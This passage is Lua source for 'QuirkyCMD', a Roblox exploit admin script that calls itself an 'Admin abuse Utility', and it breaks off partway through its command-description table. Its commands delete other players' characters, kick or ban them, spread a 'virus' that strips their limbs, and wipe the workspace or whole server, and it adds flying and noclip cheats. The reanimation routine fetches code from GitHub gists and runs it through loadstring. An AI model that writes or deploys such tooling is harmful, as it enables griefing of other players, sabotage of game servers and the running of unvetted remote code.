		addCommand("nosounds",function()
			for i,v in pairs(game:GetDescendants()) do
				if not v:IsA("Sound") then continue end
				delete(v)
			end
		end, {}, 1)
	
		addCommand("noteams", function()
			for i,v in pairs(game:GetService("Teams")) do
				delete(v)
			end
		end, {}, 1)
	
		addCommand("clearlighting",function()
			for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
				delete(v)
			end
		end, {}, 1)
	
		addCommand("shutdown", function()
			for i,v in pairs(players:GetPlayers()) do
				if i == 1 then continue end
				delete(v)
			end
			delete(localPlayer)
		end, {}, 2)
	
		addCommand("nuke",function() 
			for i,v in pairs(workspace:GetChildren()) do
				delete(v)
			end
	
			for i,v in pairs(players:GetPlayers()) do
				if i == 1 then continue end
				delete(v)
			end
		end, {}, 2)
	
		addCommand("witherws",function(plrs, input)
			local speedInp = input:split(" ")[2]
			local speed = speedInp and tonumber(speedInp) or .25
			local baseparts = {}
			for i,v in pairs(workspace:GetChildren()) do
				if players:FindFirstChild(v.Name) then continue end
				if v:IsA("BasePart") then 
					table.insert(baseparts,v) 
				end
	
				for i,instance in pairs(v:GetDescendants()) do
					if not instance:IsA("BasePart") then continue end
					table.insert(baseparts, instance)
				end
			end
	
			for i = 1, #baseparts do
				local len = #baseparts
				local part = baseparts[math.random(1,len)]
				if not part:IsDescendantOf(workspace) then continue end
				delete(part)
				task.wait(speed)
			end
	
		end, {}, 2)
	
		addCommand("wither",function(plrs, input)
			local speedInp = input:split(" ")[2]
			local speed = speedInp and tonumber(speedInp) or 1
			local function decay(plr)
				local char = plr.Character
				if not char then return end
				local limbs = {}
				local shuffledLimbs = {}
				for i,v in pairs(char:GetChildren()) do
					if (not v:IsA("BasePart")) or (v.Name:find("Torso") or v.Name == "Head" or v.Name == "HumanoidRootPart") then continue end
					table.insert(limbs, v)
				end
	
				for i = 1, #limbs do
					local rng = math.random(#limbs)
					table.insert(shuffledLimbs , limbs[rng])
					table.remove(limbs, rng)
				end
	
				for i,v in pairs(shuffledLimbs) do
					if not char:FindFirstChild(v.Name) then continue end
					if plr.Character ~= char then return end
					delete(v)
					table.remove(limbs,i)
					task.wait(speed)
				end
	
				local head = char:FindFirstChild("Head")
				if not head then return end
				delete(head)
				task.wait(0.1)
				for i,v in pairs(char:GetChildren()) do
					if not v:IsA("BasePart") then continue end
					delete(v)
				end
			end
			for i,v in pairs(plrs) do 
				task.spawn(decay,v)
			end
		end, {"decay"}, 1)
	
		local infectSpeed = 1
		local function infectPlayer(plr)
			local char = plr.Character
			if not char then return end
			debugPrint(`{plr.Name} was infected`)
			local limbs = {}
			local limbAmount
			local shuffledLimbs = {}
			for i,v in pairs(char:GetChildren()) do
				if (not v:IsA("BasePart")) or (v.Name:find("Torso") or v.Name == "Head" or v.Name == "HumanoidRootPart") then continue end
				table.insert(limbs, v)
			end
	
			limbAmount = #limbs
	
			for i = 1, #limbs do
				local rng = math.random(#limbs)
				table.insert(shuffledLimbs , limbs[rng])
				table.remove(limbs, rng)
			end
	
			for i,v in pairs(shuffledLimbs) do
				task.wait((45/limbAmount) * infectSpeed)
				local infectedIndex = table.find(infected,plr)
				if not char:FindFirstChild(v.Name) then continue end
				if plr.Character ~= char then return end
				delete(v)
				table.remove(limbs,i)
			end
			local head = char:FindFirstChild("Head")
			if head then
				delete(head)
				task.wait(0.1)
			end
			for i,v in pairs(char:GetChildren()) do
				if not v:IsA("BasePart") then continue end
				delete(v)
			end
			table.remove(infected,table.find(infected,plr))
		end
	
		table.insert(genv.connections,rs.Heartbeat:Connect(function()
			for i,v in pairs(infected) do
				local char = v.Character
				if not char then continue end
				local hum = char:FindFirstChild("Humanoid")
				if hum and hum.Health <= 0 then table.remove(infected,table.find(infected,v)) continue end
				local hrp = hum and hum.RootPart or char:FindFirstChild("HumanoidRootPart")
				if not hrp then continue end
				for i,v in pairs(players:GetPlayers()) do
					if table.find(infected,v) then continue end
					local tchar = v.Character
					if not tchar then continue end
					local thum = tchar:FindFirstChild("Humanoid")
					local thrp = thum and thum.RootPart or tchar:FindFirstChild("HumanoidRootPart")
					if not thrp then continue end
					if (thrp.Position - hrp.Position).Magnitude >= 5 then continue end
					table.insert(infected, v)
					task.spawn(infectPlayer,v)
				end
			end
		end))
	
		addCommand("virus",function(plrs, input)
			local speedInp = input:split(" ")[2]
			local speed = speedInp and tonumber(speedInp) or 0
			infectSpeed = speed
			for i,v in pairs(plrs) do 
				table.insert(infected,v)
				task.spawn(infectPlayer,v)
			end
		end, {"infect"}, 1)
	
		addCommand("unvirus", function(plrs)
			for i,v in pairs(plrs) do
				local index = table.find(infected,v)
				if index then table.remove(infected,index) end
			end
		end, {"uninfect", "cure"}, 1)
	
	
		table.insert(genv.connections, rs.Heartbeat:Connect(function()
			for name, range in pairs(killauras) do
				local plr = players:FindFirstChild(name)
				if not plr then killauras[name] = nil continue end
				local char = plr.Character
				if not char then continue end
				local pos = char:GetPivot().Position
	
				for i,v in pairs(players:GetPlayers()) do
					if v == plr then continue end
					local tchar = v.Character
					if not tchar then continue end
					local tpos = tchar:GetPivot().Position
					local distance = (pos - tpos).Magnitude
					if distance > range then continue end
					local hum = tchar:FindFirstChild("Humanoid")
					if hum and hum.Health <= 0 then continue end
					runCommand("kill",{v})
				end
			end
		end))
	
		addCommand("killaura",function(plrs, input)
			local plrs = (#plrs > 0 and plrs) or ({localPlayer})
			local split = input:split(" ")
			local range = tonumber(split[#split]) or 10
			for i,v in pairs(plrs) do
				killauras[v.Name] = range
			end
		end, {"aura"}, 1)
	
		addCommand("unkillaura",function(plrs)
			for i,v in pairs(plrs) do
				killauras[v.Name] = nil
			end
		end, {"unaura"}, 1)
	
		table.insert(genv.connections, rs.Heartbeat:Connect(function()
			for name, range in pairs(kickauras) do
				local plr = players:FindFirstChild(name)
				if not plr then kickauras[name] = nil continue end
				local char = plr.Character
				if not char then continue end
				local pos = char:GetPivot().Position
	
				for i,v in pairs(players:GetPlayers()) do
					if v == nil or v == plr then continue end
					local tchar = v.Character
					if not tchar then continue end
					local tpos = tchar:GetPivot().Position
					local distance = (pos - tpos).Magnitude
					if distance > range then continue end
					delete(v)
				end
			end
		end))
	
		addCommand("kickaura",function(plrs, input)
			local plrs = (#plrs > 0 and plrs) or ({localPlayer})
			local split = input:split(" ")
			local range = tonumber(split[#split]) or 3
			for i,v in pairs(plrs) do
				kickauras[v.Name] = range
			end
		end, {}, 2)
	
		addCommand("unkickaura",function(plrs)
			for i,v in pairs(plrs) do
				kickauras[v.Name] = nil
			end
		end, {}, 2)
	
		addCommand("close", abort, {}, 3)
	
		local flyLoop
		addCommand("fly",function() -- original made by apeyton
			local hum = character:FindFirstChildOfClass("Humanoid")
			if not hum then return end
	
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			hum.PlatformStand = true
			hrp.Anchored = true
	
			if flyLoop then flyLoop:Disconnect() end
			flyLoop = rs.Heartbeat:Connect(function(deltaTime)
				local moveDir = hum.MoveDirection * (flySpeed * deltaTime)
				local hrpCF = hrp.CFrame
				local cameraCF = camera.CFrame
				local cameraOffset = hrpCF:ToObjectSpace(cameraCF).Position + hum.CameraOffset
				cameraCF = cameraCF * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
				local cameraPos = cameraCF.Position
				local hrpPos = hrpCF.Position
	
				local objectSpaceVelocity = CFrame.new(cameraPos, Vector3.new(hrpPos.X, cameraPos.Y, hrpPos.Z)):VectorToObjectSpace(moveDir)
				hrp.CFrame = CFrame.new(hrpPos) * (cameraCF - cameraPos) * CFrame.new(objectSpaceVelocity)
			end)
		end, {}, 3)
	
		addCommand("unfly",function()
			if not flyLoop then return end
			flyLoop:Disconnect()
			local hum = character:FindFirstChildOfClass("Humanoid")
			if hum then hum.PlatformStand = false end
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp then hrp.Anchored = false end
	
		end, {}, 3)
	
		addCommand("flyspeed",function(plrs, input)
			flySpeed = tonumber(input) or 50
		end, {}, 3)
	
		addCommand("walkspeed", function(plrs, input)
			local speed = tonumber(input) or 16
			local humanoid = character:FindFirstChild("Humanoid")
			if not humanoid then return end
			humanoid.WalkSpeed = speed
		end, {"speed", "ws"}, 3)
	
		addCommand("jumppower", function(plrs, input)
			local jp = tonumber(input) or 50
			local humanoid = character:FindFirstChild("Humanoid")
			if not humanoid then return end
			humanoid.JumpPower = jp
		end, {"jp"}, 3)
	
		local noclipLoop
		addCommand("noclip", function()
			if noclipLoop then noclipLoop:Disconnect() end
			noclipLoop = rs.Stepped:Connect(function()
				for i,v in pairs(character:GetDescendants()) do
					if not (v:IsA("BasePart") and v.CanCollide) then continue end
					v.CanCollide = false
				end
			end)
		end, {"nc"}, 3)
	
		addCommand("clip",function()
			if noclipLoop then noclipLoop:Disconnect() end
		end, {"c"}, 3)
	
		-- credits to hydroprocessed for the original hat orbit script <3
		addCommand("hatorbit",function()
			-- .offset (how close the hats are to you)
			-- .mode 1-11 (different modes up to 11)
			-- .speed (how fast the hats move)
			-- .angular x y z (how fast the hats rotate)
			local char = character
			local hum = char:FindFirstChild("Humanoid")
			if not hum then return end
			local hats = {}
			local mov = {}
			local mov2 = {}
	
			local function breakJoints(model)
				for i,v in pairs(model:GetDescendants()) do
					if not v:IsA("JointInstance") then continue end
					delete(v)
				end
			end
	
			local function ftp(str)
				local pt = {}
				if str ~= "me" and str ~= "random" then
					for i, v in pairs(players:GetPlayers()) do
						if v.Name:lower():find(str:lower()) then
							table.insert(pt, v)
						end
					end
				elseif str == "me" then
					table.insert(pt, localPlayer)
				elseif str == "random" then
					table.insert(pt, players:GetPlayers()[math.random(1, #players:GetPlayers())])
				end
				return pt
			end
	
			for i,v in pairs(hum:GetAccessories()) do
				local handle = v:FindFirstChild("Handle")
				if not handle then continue end
				table.insert(hats,v)
			end
	
			for _, v in pairs(hats) do
				local handle = v.Handle
				handle.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
				handle.CanCollide = false
				breakJoints(handle)
				repeat task.wait() until handle:FindFirstChildOfClass("Weld") == nil
				local still = Instance.new("BodyAngularVelocity", handle)
				still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
				still.AngularVelocity = Vector3.new(0, 0, 0)
				local align = Instance.new("AlignPosition", handle)
				align.MaxForce = 1000000
				align.MaxVelocity = math.huge
				align.RigidityEnabled = false
				align.ApplyAtCenterOfMass = true
				align.Responsiveness = 200
				local a0 = Instance.new("Attachment", handle)
				local a1 = Instance.new("Attachment", char.Head)
				align.Attachment0 = a0
				align.Attachment1 = a1
				table.insert(mov, a1)
				table.insert(mov2, still)
			end
	
			local velocityCon = rs.Heartbeat:connect(function()
				for i,v in pairs(hats) do
					local handle = v:FindFirstChild("Handle")
					if not handle then continue end
					handle.Velocity = Vector3.new(0,30,0)
				end
	
			end)
			table.insert(genv.connections, velocityCon)
	
			local par = {}
			local partsFolder = Instance.new("Folder", char)
			partsFolder.Name = "wacky parts folder"
			for _, v in pairs(mov) do
				local part = Instance.new("Part", partsFolder)
				part.Anchored = true
				part.Size = Vector3.new(1, 1, 1)
				part.Transparency = 1
				part.CanCollide = false
				table.insert(par, part)
			end
	
			local rotx = 0
			local rotz = math.pi / 2
			local height = 0
			local heighti = 1
			local offset = 10
			local speed = 0.5
			local mode = 4
			local angular = Vector3.new(0, 0, 0)
			local l = 1
			local alignCon = rs.RenderStepped:Connect(function()
				rotx = rotx + speed / 100
				rotz = rotz + speed / 100
				l = (l >= 360 and 1 or l + speed)
	
				for i, v in pairs(par) do
					v.CFrame = CFrame.new(char.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0)
				end
	
				if heighti == 1 then
					height = height + speed / 100
				elseif heighti == 2 then
					height = height - speed / 100
				end
				if height > 2 then
					heighti = 2
				end
				if height < -1 then
					heighti = 1
				end
	
				if mode == 1 then
					for _, v in pairs(mov) do
						v.Position = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset)
					end
				elseif mode == 2 then
					for _, v in pairs(mov) do
						v.Position = Vector3.new(offset, height, offset)
					end
				elseif mode == 3 then
					for _, v in pairs(mov) do
						v.Position = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset)
					end
				elseif mode == 4 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new(char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z)
					end
				elseif mode == 5 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.cos(rotz) - i) * offset)
					end
				elseif mode == 6 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.tan(rotz) - i) * offset)
					end
				elseif mode == 7 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset)
					end
				elseif mode == 8 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset)
					end
				elseif mode == 9 then
					pcall(function()
						local so = nil
						for k, b in pairs(char:GetChildren()) do
							if not b:IsA"Tool" then
								for h, j in pairs(b:GetDescendants()) do
									if j:IsA"Sound" then
										so = j
									end
								end
							end
						end
						if so ~= nil then
							offset = so.PlaybackLoudness / 35
							speed = so.PlaybackLoudness / 500
							angular = Vector3.new(0, so.PlaybackLoudness / 75, 0)
						end
					end)
					for i, v in pairs(mov) do
						v.Position = Vector3.new(char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z)
					end
				elseif mode == 10 then
					offset = height * 15
					for i, v in pairs(mov) do
						v.Position = Vector3.new(char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z)
					end
				elseif mode == 11 then
					for i, v in pairs(mov) do
						v.Position = Vector3.new(char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(localPlayer:GetMouse().Hit.p)).X, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(localPlayer:GetMouse().Hit.p)).Y, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(localPlayer:GetMouse().Hit.p)).Z) + Vector3.new(char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z)
					end
				end
				for _, v in pairs(mov2) do
					v.AngularVelocity = angular
				end
			end)
	
			local chatCon
			local function onChat(data)
				local c = modernChat and data.Text or data
				local plr = modernChat and players:GetPlayerByUserId(data.TextSource.UserId) or localPlayer
				if plr ~= localPlayer then return end
				if c:split(" ")[1] == ".orbit" then
					for _, v in pairs(mov) do
						char = ftp(c:split(" ")[2])[1].Character
						v.Parent = ftp(c:split(" ")[2])[1].Character.HumanoidRootPart
					end
				end
				if c:split(" ")[1] == ".speed" then
					speed = tonumber(c:split(" ")[2])
				end
				if c:split(" ")[1] == ".mode" then
					mode = tonumber(c:split(" ")[2])
				end
				if c:split(" ")[1] == ".offset" then
					offset = tonumber(c:split(" ")[2])
				end
				if c:split(" ")[1] == ".angular" then
					angular = Vector3.new(tonumber(c:split(" ")[2]), tonumber(c:split(" ")[3]), tonumber(c:split(" ")[4]))
				end
			end
	
			if modernChat then
				game:GetService("TextChatService").TextChannels["RBXGeneral"].OnIncomingMessage = function(data)
					task.spawn(onChat,data)
					handleChat(data)
				end
			else
				chatCon = localPlayer.Chatted:Connect(onChat)
				table.insert(genv.connections, chatCon)
			end
	
	
			local diedCon = hum.Died:Connect(function()
				alignCon:Disconnect()
				velocityCon:Disconnect()
				if not modernChat then 
					chatCon:Disconnect()
				else
					game:GetService("TextChatService").TextChannels["RBXGeneral"].OnIncomingMessage = function(data)
						handleChat(data)
					end
				end
			end)
			table.insert(genv.connections, diedCon)
		end, {}, 3)
	
		-- credits to @xyzkade and @deuces1961 for Kade's reanim as a base
		local function loadReanim()
			local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
			local hum = char:WaitForChild("Humanoid")
			local simRadius = gethiddenproperty and gethiddenproperty(localPlayer,"SimulationRadius")
			local requiredRadius = 20
			local isR15 = hum.RigType == Enum.HumanoidRigType.R15
			local forcefield = char:FindFirstChildOfClass("ForceField")
			local fakeHum = hum:Clone()
			local hrp = char:WaitForChild("HumanoidRootPart")
			local hrpCF = hrp.CFrame
			local stopAlign = false
			local stopAntiVoid = false
			local limbs = {}
			local hatHandles = {}
			local reanimConnections = {}
	
			runCommand("clip")
	
			if simRadius and simRadius < requiredRadius then
				repeat
					notify("Please wait",`Waiting for bigger SimulationRadius ({tostring(math.floor(simRadius))}/{tostring(requiredRadius)})`, 2)
					task.wait(2)
				until gethiddenproperty(localPlayer,"SimulationRadius") >= requiredRadius
				if localPlayer.Character == nil or localPlayer.Character ~= char or hum.Parent == nil or hum.Health <= 0 then return end
			end
	
			if forcefield then forcefield:Destroy() end
			char.Archivable = true
	
			local rig = (not isR15) and char:Clone()
	
			if isR15 then
				local canGetObjects, loadedRig = pcall(function() return game:GetObjects("rbxassetid://18418211383")[1] end)
				local r6Rig = isTesting and rStorage:WaitForChild("R6Rig") or canGetObjects and loadedRig or loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/ad264038a91f7fa11bec2f67dad3feaf/raw"))()
				local humDesc = players:GetCharacterAppearanceAsync(localPlayer.UserId)
				local r6Head = r6Rig.Head
				local r15Head = char.Head
				local surfaceAppearance = r15Head:FindFirstChildOfClass("SurfaceAppearance")
				local face = r15Head:FindFirstChild("face")
	
				if surfaceAppearance then 
					surfaceAppearance:Clone().Parent = r6Head
				else
					--if face then r6Head.face.Texture = face.Texture end
					--r6Head.face.Transparency = 0
				end
	
				for i,v in pairs(r15Head:GetChildren()) do
					if not v:IsA("Attachment") then continue end
					v:Clone().Parent = r6Head
				end
	
				for i,v in pairs(humDesc:GetDescendants()) do
					if v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
						v.Parent = r6Rig
						continue
					end
					if v:IsA("Accessory") or v:IsA("Hat") then
						r6Rig:WaitForChild("Humanoid"):AddAccessory(v)
					end
				end
	
	
				rig = r6Rig
			else
				local mesh = char.Head:FindFirstChildOfClass("SpecialMesh")
				local face = char.Head:FindFirstChild("face")
				if mesh and face then
					delete(face)
				end
			end	
	
			local rigHRP = rig:WaitForChild("HumanoidRootPart")
			local rigHum = rig:FindFirstChild("Humanoid")
	
			rig.Name = "wacky reanim rig"
	
	
			for i,v in pairs(char:GetChildren()) do
				if not v:IsA("BasePart") then continue end
				table.insert(limbs, {v,rig[v.Name]})
			end
	
	
			local accessories = hum:GetAccessories()
			local rigAccessories = rigHum:GetAccessories()
	
			for i,v in pairs(accessories) do
				if not isR15 then
					table.insert(hatHandles,{v.Handle,rigAccessories[i].Handle})
					continue
				end
				for _,rigAcc in pairs(rigAccessories) do
					local handle = rigAcc.Handle
					local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle
					local texture = handle == mesh and mesh.TextureID or mesh.TextureId
					if not (rigAcc.Name == v.Name and mesh.MeshId == v.Handle.MeshId and texture == v.Handle.TextureID) then continue end
					table.insert(hatHandles,{v.Handle,rigAcc.Handle})
					continue 
				end
			end
	
			local clock = os and os.clock or tick
			local cos = math.cos
			local sin = math.sin
			local cfNew = CFrame.new
			local cfZero = CFrame.identity
			local v3New = Vector3.new
			local v3Zero = Vector3.zero
	
			local changedMaxSimRad = pcall(sethiddenproperty, localPlayer, "MaximumSimulationRadius", 1000)
			local changedSimRad = pcall(sethiddenproperty, localPlayer, "SimulationRadius", 1000)
			local netlessCF = cfZero
			local sineValue = 0
	
	
			local function align(part0, part1, offset)
				if stopAlign then return end
				if part0 and part0.Parent and part1 and part1.Parent then
					local part0_mass = part1.Mass * 5
					part0.AssemblyLinearVelocity = v3New(part1.AssemblyLinearVelocity.X * part0_mass, sineValue, part1.AssemblyLinearVelocity.Z * part0_mass)
					part0.AssemblyAngularVelocity = part1.AssemblyAngularVelocity
	
					if isnetworkowner(part0) then
						part0.CFrame = part1.CFrame * offset
					end
				end
			end
	
			local function setCamera(model)
				local oldCamCF = camera.CFrame
				camera.CameraSubject = model.Humanoid
				camera:GetPropertyChangedSignal("CFrame"):Once(function()
					camera.CFrame = oldCamCF
				end)
			end
	
			local function disableCollisions(model,canTouchAndCast)
				for _, part in next, model:GetDescendants() do
					if part and part:IsA("BasePart") then
						part.CanCollide = false
						part.CanQuery = canTouchAndCast
						part.CanTouch = canTouchAndCast
					end
				end
			end
	
			local function makeTransparent(model)
				for i,v in pairs(model:GetDescendants()) do
					if not (v:IsA("BasePart") or v:IsA("Decal")) then continue end
					v.Transparency = 1
				end
			end
	
			local function breakJoints(model)
				for i,v in pairs(model:GetDescendants()) do
					if not v:IsA("JointInstance") then continue end
					delete(v)
				end
			end
	
			local function removeScripts(model)
				for i,v in pairs(model:GetChildren()) do
					if not (v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") or v.Name == "Animate") then continue end
					delete(v)
				end
			end
	
			local function removeTouchTriggers(model)
				for i,v in pairs(model:GetDescendants()) do
					if not v:IsA("TouchTransmitter") then continue end
					delete(v)
				end
			end
	
			local function onPostSim()
				for _, data in next, limbs do
					align(data[1], data[2],netlessCF)
				end
	
				for _, data in next, hatHandles do
					align(data[1], data[2], netlessCF)
				end
			end
	
			local function onPreSim()
				netlessCF = cfNew(0.01 * sin(clock()*16), 0, 0.01 * math.cos(clock()*16))
				sineValue = 40 - 3 * sin(clock()*10)
	
				if stopAntiVoid or rigHRP.Position.Y > (workspace.FallenPartsDestroyHeight + 50) then return end
				rigHRP.CFrame = hrpCF
				rigHRP.AssemblyLinearVelocity = v3Zero
				rigHRP.AssemblyAngularVelocity = v3Zero
			end
	
	
			rigHRP.CFrame = hrpCF
			rig.Parent = workspace
			localPlayer.Character = rig
			setCamera(rig)
			rig.Animate.Enabled = false
			rig.Animate.Enabled = true
			hum:ChangeState(Enum.HumanoidStateType.Physics)
			repeat task.wait() until limbs[3][1].CanCollide
			task.wait(0.05)
			delete(hum)
			repeat task.wait() until hum.Parent == nil
			task.wait()
			fakeHum.Parent = char
			task.wait()
			table.insert(reanimConnections, rs.PreSimulation:Connect(onPreSim))
			table.insert(reanimConnections, rs.PostSimulation:Connect(onPostSim))
			table.insert(reanimConnections, rs.Stepped:Connect(function()
				disableCollisions(char,false)
				disableCollisions(rig,true)
			end))
	
			breakJoints(char)
			makeTransparent(char)
			removeScripts(char)
			removeTouchTriggers(char)
	
			genv.LoadLibrary = function(lib) return loadstring(httpget("https://raw.githubusercontent.com/Roblox/Core-Scripts/master/CoreScriptsRoot/Libraries/" .. lib .. ".lua"))() end
	
			local reset = Instance.new("BindableEvent")
			reset.Event:Connect(function()
				if stopAlign then
					local hum = character:FindFirstChildOfClass("Humanoid")
					if not hum then return character:BreakJoints() end
					hum.Health = 0
					return
				end
				notify("Resetting", "Please wait ~6 seconds", 6)
				stopAntiVoid = true
				rigHRP.Anchored = true
				rigHRP.CFrame = CFrame.new(0,workspace.FallenPartsDestroyHeight + 5,0)
				task.wait(0.5)
				stopAlign = true
				rigHum:ChangeState(Enum.HumanoidStateType.Dead)
				localPlayer.CharacterAdded:Wait()
				rig:Destroy()
				for i,v in pairs(reanimConnections) do
					v:Disconnect()
				end
			end)
	
			sgui:SetCore("ResetButtonCallback", reset)
	
			notify("Success!", "reanim loaded!")
		end
		addCommand("reanim",function() 
			task.spawn(loadReanim)
		end, {"reanimate"}, 3)
	
		--[[Add scrolling command list]]--
		local scrollText = "QuirkyCMD made by Cynatica | the best Admin abuse Utility! | "
		if not isMobile then
			scrollText ..= "press ; to open/hide the Ui | "
		end
		local charCount = 12
		local spaces = 0
		local scrollSpeed = 0.12 -- sec/char
		local sample = scrollText..string.rep(" ", spaces)
		local displayString = sample:sub(1, charCount)
		local strlen = string.len(sample)
	
		local counter = 1
		local timer = 0
	
		for i,v in pairs(scrollText:split("")) do
			if v ~= " " then continue end
			spaces += 1
		end
	
		table.insert(genv.connections, rs.Heartbeat:Connect(function(dt)
			timer += dt
			if timer > scrollSpeed then
				while timer > scrollSpeed do
					timer -= scrollSpeed
					counter = (counter + 1)%strlen
				end
	
				if counter + charCount <= strlen then
					displayString = sample:sub(counter, counter + charCount)
				else
					displayString = sample:sub(counter, strlen)..sample:sub(1, counter + charCount - strlen)
				end
			end
	
			box.PlaceholderText = (("%s"):format(displayString))
		end))
	
		--[[Sort commands alphabetically]]--
		table.sort(commands, function(a,b)
			return a.name < b.name
		end)
	
		--[[Command list with every description.]]--
		local cmdData = {
			["admin"] = "Grants or removes admin permissions",
			["aliases"] = "Prints all command aliases.",
			["bald"] = "Removes all accessories from the character, making them bald.",
			["ban"] = "Bans players by their UserId and deletes them from the server.",
			["bang"] = "Plays a 'bang' animation and attaches to the target player.",
			["baseplate"] = "Deletes everything in the workspace except large or nearby baseplates.",
			["bighats"] = "Enlarges R15 hats by deleting scale values and original sizes.",
			["blockhats"] = "Removes hat meshes for R6 characters.",
			["blockhead"] = "Removes head mesh for R6 characters.",
			["blocktools"] = "Removes any meshes from tool handles, cleaning up their visuals.",
			["bring"] = "Teleports another player to you using tool teleportation.  Teleports another player to you using tool teleportation.",
			["btools"] = "Manipulates tools (give/remove)",
			["clearbans"] = "Clears the ban list.",
			["cleargui"] = "Removes all GUI elements from the screen (from sgui).",
			["clearlighting"] = "Deletes all Lighting service children.",
			["clearstarter"] = "Clears StarterGui, StarterPack, and StarterPlayer scripts except for whitelisted items.",
			["clearstorage"] = "Deletes all objects in ReplicatedStorage except the exploit remote and chat folders.",
			["clearws"] = "Clears the workspace of all non-player items.",
			["clickdelete"] = "Enables click-to-delete mode by targeting with your mouse.",
			["clip"] = "Disables noclip mode, restoring normal collision.",
			["cmds"] = "Shows the command UI",
			["control"] = "Takes control of another player's character using tool-based hijacking.",
			["deletename"] = "Deletes any object in the game whose name matches the given text.",
			["droptools"] = "Deletes player's tool when they equip it, simulating a drop and break.",
			["explorer"] = "Opens a dark-themed Dex Explorer GUI.",
			["fakechat"] = "Makes your character appear like it's chatting and automatically follows another player.",
			["fling"] = "Flings a player using physics-based forces by touching their character.",
			["fly"] = "Enables flight mode by manipulating the character’s root part position.",
			["flyspeed"] = "Sets the speed multiplier for flight movement.",
			["freeze"] = "Stops all character movement by anchoring and platform-standing the humanoid.",
			["givetools"] = "Teleports your tools into the target player’s position to force equip.",
			["goto"] = "Teleports you to the target player's position.",
			["grabtools"] = "Pulls all tools in the workspace to your character.",
			["gun"] = "Manipulates tools (give/remove)",
			["hatorbit"] = "Makes your hats orbit around your character using physics alignment.",
			["invisible"] = "Makes the character invisible using transparency tricks or HRP deletion.",
			["jumppower"] = "Sets the jump power of your humanoid.",
			["kick"] = "Deletes the player from the game (client-side).",
			["kickaura"] = "Automatically kicks players who get too close (within a specified range).",
			["kill"] = "Deletes the Neck joint, killing the player.",
			["killaura"] = "Auto-kills nearby players in a loop based on a range.",
			["korblox"] = "Deletes the character’s right leg to simulate the Korblox avatar.",
			["legwalk"] = "Deletes upper arms, waist joint, and accessories to make a leg-only walking rig.",
			["lockws"] = "Prevents new non-player objects from being added to the workspace by deleting them as they appear.",
			["loopkill"] = "Repeatedly executes the kill command on target players every frame.",
			["mute"] = "Deletes TextChatService text channels of players to mute them. Does not work in legacy chat.",
			["naked"] = "Removes Pants, Shirt, and Shirt Graphic along with WrapLayer elements, making the character visually naked.",
			["noanims"] = "Deletes the Animator and Animate script from a player to completely stop all animations.",
			["noarms"] = "Deletes all arm parts from a character (any limb with 'arm' in its name).",
			["nochat"] = "Deletes chat UIs or channels, disabling chat.",
			["noclip"] = "Disables collisions on all character parts, allowing walking through objects.",
			["noface"] = "Deletes all face decals from the player’s head.",
			["nolegs"] = "Deletes legs and feet from a character.",
			["nolimbs"] = "Deletes all arm and leg parts.",
			["noseats"] = "Deletes all Seats and VehicleSeats in the workspace.",
			["nosounds"] = "Deletes all Sound objects across the entire game.",
			["nospawns"] = "Deletes all SpawnLocation instances.",
			["nostats"] = "Deletes the leaderstats folder from a player.",
			["noteams"] = "Deletes all Teams in the game.",
			["notextures"] = "Deletes all Decals and Textures in the workspace.",
			["notools"] = "Manipulates tools (give/remove)",
			["nuke"] = "Deletes all workspace objects and players (except local player).",
			["owner"] = "Promotes a player to privilege level 2 (Owner).",
			["punch"] = "Gives the player a punch tool that can kill others on contact.",
			["punish"] = "Deletes the entire character of the target player.",
			["ragdoll"] = "Deletes HumanoidRootPart from a player, causing a ragdoll effect.",
			["ranks"] = "Prints a list of all admins and owners.",
			["reanim"] = "Starts a reanimation routine (not fully implemented in visible script).",
			["rejoin"] = "Teleports the player (rejoin or server hop)",
			["rescale"] = "Deletes avatar scaling values (HeightScale, WidthScale, etc.).",
			["reset"] = "Moves character parts to kill the player and trigger a respawn.",
			["serverlock"] = "Prevents players from joining the server by deleting them on join.",
			["setbind"] = "Sets the keybinding to toggle the command bar.",
			["setprefix"] = "Changes the prefix used to enter commands.",
